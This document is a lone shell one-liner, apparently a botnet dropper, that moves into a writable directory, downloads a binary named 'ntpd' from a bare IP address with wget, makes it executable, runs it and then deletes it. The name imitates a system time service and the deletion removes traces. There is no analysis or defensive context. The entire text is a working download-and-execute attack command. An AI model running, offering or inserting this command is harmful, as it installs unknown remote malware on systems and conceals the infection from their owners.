cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.85.237/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
